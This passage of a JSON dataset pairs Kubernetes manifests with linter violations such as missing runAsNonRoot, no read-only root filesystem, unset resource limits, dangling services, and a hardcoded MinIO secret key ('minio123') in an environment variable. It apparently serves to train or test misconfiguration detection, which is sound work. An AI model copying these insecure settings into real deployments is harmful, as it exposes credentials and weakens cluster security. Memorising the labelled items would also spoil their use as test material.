    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: slave\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: slave\n  template:\n    metadata:\n      labels:\n        app: slave\n    spec:\n      containers:\n      - name: slave\n        image: alpine:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n        command:\n        - /bin/sh\n        - -ec\n        - sleep 1000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7628",
    "manifest_path": "data/manifests/the_stack_sample/sample_2791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: slave\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: slave\n  template:\n    metadata:\n      labels:\n        app: slave\n    spec:\n      containers:\n      - name: slave\n        image: alpine:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n        command:\n        - /bin/sh\n        - -ec\n        - sleep 1000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"slave\" does not have a read-only root file system"
  },
  {
    "id": "7629",
    "manifest_path": "data/manifests/the_stack_sample/sample_2791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: slave\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: slave\n  template:\n    metadata:\n      labels:\n        app: slave\n    spec:\n      containers:\n      - name: slave\n        image: alpine:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n        command:\n        - /bin/sh\n        - -ec\n        - sleep 1000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"slave\" is not set to runAsNonRoot"
  },
  {
    "id": "7630",
    "manifest_path": "data/manifests/the_stack_sample/sample_2791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: slave\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: slave\n  template:\n    metadata:\n      labels:\n        app: slave\n    spec:\n      containers:\n      - name: slave\n        image: alpine:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n        command:\n        - /bin/sh\n        - -ec\n        - sleep 1000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"slave\" has cpu request 0"
  },
  {
    "id": "7631",
    "manifest_path": "data/manifests/the_stack_sample/sample_2792.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openshift-pipelines-operator\n  namespace: openshift-operators\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openshift-pipelines-operator\n  template:\n    metadata:\n      labels:\n        name: openshift-pipelines-operator\n    spec:\n      serviceAccountName: openshift-pipelines-operator\n      containers:\n      - name: openshift-pipelines-operator\n        image: quay.io/openshift-pipeline/openshift-pipelines-operator:v0.5.2\n        command:\n        - openshift-pipelines-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: openshift-pipelines-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"openshift-pipelines-operator\" does not have a read-only root file system"
  },
  {
    "id": "7632",
    "manifest_path": "data/manifests/the_stack_sample/sample_2792.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openshift-pipelines-operator\n  namespace: openshift-operators\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openshift-pipelines-operator\n  template:\n    metadata:\n      labels:\n        name: openshift-pipelines-operator\n    spec:\n      serviceAccountName: openshift-pipelines-operator\n      containers:\n      - name: openshift-pipelines-operator\n        image: quay.io/openshift-pipeline/openshift-pipelines-operator:v0.5.2\n        command:\n        - openshift-pipelines-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: openshift-pipelines-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"openshift-pipelines-operator\" not found"
  },
  {
    "id": "7633",
    "manifest_path": "data/manifests/the_stack_sample/sample_2792.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openshift-pipelines-operator\n  namespace: openshift-operators\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openshift-pipelines-operator\n  template:\n    metadata:\n      labels:\n        name: openshift-pipelines-operator\n    spec:\n      serviceAccountName: openshift-pipelines-operator\n      containers:\n      - name: openshift-pipelines-operator\n        image: quay.io/openshift-pipeline/openshift-pipelines-operator:v0.5.2\n        command:\n        - openshift-pipelines-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: openshift-pipelines-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"openshift-pipelines-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "7634",
    "manifest_path": "data/manifests/the_stack_sample/sample_2792.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openshift-pipelines-operator\n  namespace: openshift-operators\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openshift-pipelines-operator\n  template:\n    metadata:\n      labels:\n        name: openshift-pipelines-operator\n    spec:\n      serviceAccountName: openshift-pipelines-operator\n      containers:\n      - name: openshift-pipelines-operator\n        image: quay.io/openshift-pipeline/openshift-pipelines-operator:v0.5.2\n        command:\n        - openshift-pipelines-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: openshift-pipelines-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"openshift-pipelines-operator\" has cpu request 0"
  },
  {
    "id": "7635",
    "manifest_path": "data/manifests/the_stack_sample/sample_2792.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openshift-pipelines-operator\n  namespace: openshift-operators\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openshift-pipelines-operator\n  template:\n    metadata:\n      labels:\n        name: openshift-pipelines-operator\n    spec:\n      serviceAccountName: openshift-pipelines-operator\n      containers:\n      - name: openshift-pipelines-operator\n        image: quay.io/openshift-pipeline/openshift-pipelines-operator:v0.5.2\n        command:\n        - openshift-pipelines-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: openshift-pipelines-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"openshift-pipelines-operator\" has memory limit 0"
  },
  {
    "id": "7636",
    "manifest_path": "data/manifests/the_stack_sample/sample_2794.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: kystkysto/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7637",
    "manifest_path": "data/manifests/the_stack_sample/sample_2794.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: kystkysto/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "7638",
    "manifest_path": "data/manifests/the_stack_sample/sample_2794.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: kystkysto/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "7639",
    "manifest_path": "data/manifests/the_stack_sample/sample_2794.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: kystkysto/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "7640",
    "manifest_path": "data/manifests/the_stack_sample/sample_2794.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: kystkysto/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "7641",
    "manifest_path": "data/manifests/the_stack_sample/sample_2795.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: '{{ .Release.Name }}-etcd-headless'\n  annotations:\n    service.alpha.kubernetes.io/tolerate-unready-endpoints: 'true'\n  labels:\n    release: '{{ .Release.Name }}'\n    app.kubernetes.io/name: '{{ .Release.Name }}'\nspec:\n  type: ClusterIP\n  clusterIP: None\n  ports:\n  - name: client\n    port: 2379\n    targetPort: client\n  - name: peer\n    port: 2380\n    targetPort: peer\n  selector:\n    release: '{{ .Release.Name }}'\n    app.kubernetes.io/name: '{{ .Release.Name }}'\n",
    "policy_id": "dangling-service",
    "violation_text": "service has invalid label selector: values[0][app.kubernetes.io/name]: Invalid value: \"{{ .Release.Name }}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
  },
  {
    "id": "7642",
    "manifest_path": "data/manifests/the_stack_sample/sample_2796.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mysql\n  namespace: default\nspec:\n  type: NodePort\n  ports:\n  - name: http\n    port: 3306\n    targetPort: 3306\n  selector:\n    app: mysql\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mysql])"
  },
  {
    "id": "7643",
    "manifest_path": "data/manifests/the_stack_sample/sample_2797.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.1.0\n  name: kube-state-metrics\n  namespace: gmp-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.1.0\n    spec:\n      containers:\n      - name: kube-state-metric\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.1.0\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - --pod=$(POD_NAME)\n        - --pod-namespace=$(POD_NAMESPACE)\n        - --port=8080\n        - --telemetry-port=8081\n        ports:\n        - name: metrics\n          containerPort: 8080\n        - name: metrics-self\n          containerPort: 8081\n        resources:\n          requests:\n            cpu: 100m\n            memory: 190Mi\n          limits:\n            cpu: 200m\n            memory: 250Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-state-metric\" does not have a read-only root file system"
  },
  {
    "id": "7644",
    "manifest_path": "data/manifests/the_stack_sample/sample_2797.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.1.0\n  name: kube-state-metrics\n  namespace: gmp-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.1.0\n    spec:\n      containers:\n      - name: kube-state-metric\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.1.0\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - --pod=$(POD_NAME)\n        - --pod-namespace=$(POD_NAMESPACE)\n        - --port=8080\n        - --telemetry-port=8081\n        ports:\n        - name: metrics\n          containerPort: 8080\n        - name: metrics-self\n          containerPort: 8081\n        resources:\n          requests:\n            cpu: 100m\n            memory: 190Mi\n          limits:\n            cpu: 200m\n            memory: 250Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kube-state-metrics\" not found"
  },
  {
    "id": "7645",
    "manifest_path": "data/manifests/the_stack_sample/sample_2797.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.1.0\n  name: kube-state-metrics\n  namespace: gmp-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.1.0\n    spec:\n      containers:\n      - name: kube-state-metric\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.1.0\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - --pod=$(POD_NAME)\n        - --pod-namespace=$(POD_NAMESPACE)\n        - --port=8080\n        - --telemetry-port=8081\n        ports:\n        - name: metrics\n          containerPort: 8080\n        - name: metrics-self\n          containerPort: 8081\n        resources:\n          requests:\n            cpu: 100m\n            memory: 190Mi\n          limits:\n            cpu: 200m\n            memory: 250Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-state-metric\" is not set to runAsNonRoot"
  },
  {
    "id": "7646",
    "manifest_path": "data/manifests/the_stack_sample/sample_2799.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20200625-dd6a466605\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "7647",
    "manifest_path": "data/manifests/the_stack_sample/sample_2799.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20200625-dd6a466605\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "7648",
    "manifest_path": "data/manifests/the_stack_sample/sample_2799.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20200625-dd6a466605\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "7649",
    "manifest_path": "data/manifests/the_stack_sample/sample_2799.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20200625-dd6a466605\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "7650",
    "manifest_path": "data/manifests/the_stack_sample/sample_2799.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20200625-dd6a466605\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "7651",
    "manifest_path": "data/manifests/the_stack_sample/sample_2802.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: myakscluster-d46c\n  labels:\n    app: myakscluster-d46c\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n    name: http\n  selector:\n    app: myakscluster-d46c\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:myakscluster-d46c])"
  },
  {
    "id": "7652",
    "manifest_path": "data/manifests/the_stack_sample/sample_2803.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-08T02-40-49Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MINIO_SECRET_KEY in container \"minio\" found"
  },
  {
    "id": "7653",
    "manifest_path": "data/manifests/the_stack_sample/sample_2803.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-08T02-40-49Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio\" does not have a read-only root file system"
  },
  {
    "id": "7654",
    "manifest_path": "data/manifests/the_stack_sample/sample_2803.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-08T02-40-49Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"minio\" is not set to runAsNonRoot"
  },
  {
    "id": "7655",
    "manifest_path": "data/manifests/the_stack_sample/sample_2803.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-08T02-40-49Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"minio\" has cpu request 0"
  },
  {
    "id": "7656",
    "manifest_path": "data/manifests/the_stack_sample/sample_2803.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-08T02-40-49Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio\" has memory limit 0"
  },
  {
    "id": "7657",
    "manifest_path": "data/manifests/the_stack_sample/sample_2805.yaml",
